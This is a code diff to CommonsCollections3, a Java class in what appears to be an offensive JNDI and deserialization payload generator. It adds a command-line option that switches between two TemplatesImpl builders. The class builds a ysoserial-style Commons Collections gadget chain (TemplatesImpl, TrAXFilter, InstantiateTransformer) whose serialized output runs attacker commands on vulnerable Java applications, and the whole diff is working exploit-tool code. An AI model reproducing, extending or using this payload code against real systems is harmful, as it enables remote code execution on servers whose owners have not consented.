@@ -4,6 +4,7 @@ import com.qi4l.jndi.enumtypes.PayloadType;
 import com.qi4l.jndi.gadgets.annotation.Authors;
 import com.qi4l.jndi.gadgets.annotation.Dependencies;
 import com.qi4l.jndi.gadgets.utils.Gadgets;
+import com.qi4l.jndi.gadgets.utils.GadgetsYso;
 import com.qi4l.jndi.gadgets.utils.JavaVersion;
 import com.qi4l.jndi.gadgets.utils.Reflections;
 import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
@@ -18,6 +19,8 @@ import java.lang.reflect.InvocationHandler;
 import java.util.HashMap;
 import java.util.Map;
 
+import static com.qi4l.jndi.Starter.cmdLine;
+
 
 /**
  * Variation on CommonsCollections1 that uses InstantiateTransformer instead of
@@ -30,7 +33,12 @@ import java.util.Map;
 public class CommonsCollections3 implements ObjectPayload<Object> {
 
     public Object getObject(PayloadType type, String... param) throws Exception {
-        Object templatesImpl = Gadgets.createTemplatesImpl(type, param);
+        final Object templatesImpl;
+        if (!cmdLine.getOptionValue("ysoserial").isEmpty() && cmdLine.getOptionValue("ysoserial").equals("1")) {
+            templatesImpl = GadgetsYso.createTemplatesImpl(param[0]);
+        } else {
+            templatesImpl = Gadgets.createTemplatesImpl(type, param);
+        }
 
         // inert chain for setup
         final Transformer transformerChain = new ChainedTransformer(
